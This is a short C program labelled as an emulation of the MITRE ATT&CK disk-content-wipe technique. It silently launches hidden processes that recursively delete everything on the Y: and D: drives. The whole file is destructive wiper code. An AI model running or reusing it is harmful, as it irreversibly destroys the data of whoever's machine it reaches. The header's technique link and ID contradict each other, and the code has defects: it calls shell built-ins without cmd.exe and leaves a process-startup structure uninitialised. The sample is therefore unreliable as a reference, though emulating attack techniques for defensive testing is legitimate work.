// Link      = https://attack.mitre.org/techniques/T1561/002/
// Technique = Disk Wipe: Disk Content Wipe
// ID        = T1561.001
// Tactics   = Impact,

#include <windows.h>


int main() {
    STARTUPINFOA si;
    si.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pi;

    if (CreateProcessA(NULL,(LPSTR)"del /s /q Y:\\*",NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

	if (CreateProcessA(NULL,(LPSTR)"rmdir /s /q D:\\",NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi)) {
        	WaitForSingleObject(pi.hProcess, INFINITE);
	        CloseHandle(pi.hProcess);
        	CloseHandle(pi.hThread);
	}
    }

    return 0;
}

